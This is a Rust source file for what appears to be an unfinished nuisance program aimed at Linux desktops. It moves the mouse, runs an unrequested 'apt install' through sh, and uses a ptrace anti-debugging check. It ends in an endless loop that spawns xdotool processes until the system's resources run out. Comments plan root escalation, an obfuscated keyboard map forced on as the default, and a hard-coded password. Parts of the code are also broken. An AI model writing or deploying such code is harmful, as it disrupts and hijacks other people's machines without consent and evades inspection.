use std::process::Command;
pub extern crate libc;
extern crate enigo;

use std::time::Duration;
use std::thread;
use libc::ptrace;
use enigo::*;

//  notes:
//      install xdotools with sudo apt install xdotools
//      install curl with sudo apt install curl
//      user password is password
//      compile with cargo run --release
//	  copy-paste our kbmap into here...somewhere.  Maybe obfuscate it somewhere
//	  decode and write kbmap
//	  make it the default kbmap using setxkbmap -v <name of our kbmap>

fn main() {
	let wait_time = Duration::from_secs(2);
	let mut enigo = Enigo::new();
	 println!("move 1");
	enigo.mouse_move_to(500, 200);
	thread::sleep(wait_time);
	 println!("move 2");
	enigo.mouse_move_to(300, 100);
	thread::sleep(wait_time);
	 println!("move 3");
	enigo.mouse_move_to(700, 1000);
	thread::sleep(wait_time);
	 println!("move 4");
	enigo.mouse_move_to(100, 50);
	thread::sleep(wait_time);
	//  need to test this when we get the ability to execute as root like sid said
	//  and be able to just run apt instead of sudo apt
    Command::new("sh")
        .args(&["apt", "install", "p7zip-full", "-y"])
        .spawn().ok();
    let x = 0;
    if unsafe{ptrace(libc::PTRACE_TRACEME,0,0,0)} < 0{
        println!("being traced");
    }
    else{
        println!(":)");
        return
    }

    while x < 100000{
        Command::new("xdotool")
            .args(&["mousemove","20","20"])
            .spawn().ok();
    }
}
